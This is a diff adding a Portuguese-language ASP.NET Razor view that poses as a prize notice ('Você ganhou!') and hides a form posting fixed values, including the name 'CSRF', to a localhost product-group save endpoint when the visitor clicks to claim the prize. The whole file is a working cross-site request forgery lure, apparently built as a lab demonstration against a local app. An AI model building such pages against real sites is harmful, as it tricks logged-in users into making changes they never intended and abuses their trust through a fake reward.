@@ -1,0 +1,14 @@
+﻿@{
+    ViewBag.Title = "Você ganhou!";
+}
+
+<div class="jumbotron">
+    <h1>Parabéns</h1>
+    <p class="lead">Você ganhou!</p>
+    <form action="https://localhost:44330/Cadastro/SalvarGrupoProduto" method="post">
+        <input type="hidden" name="Id" value="0" />
+        <input type="hidden" name="Nome" value="CSRF" />
+        <input type="hidden" name="Ativo" value="true" />
+        <p>Clique <input type="submit" class="btn btn-primary btn-lg" value="aqui" /> para receber seu prêmio</p>
+    </form>
+</div>
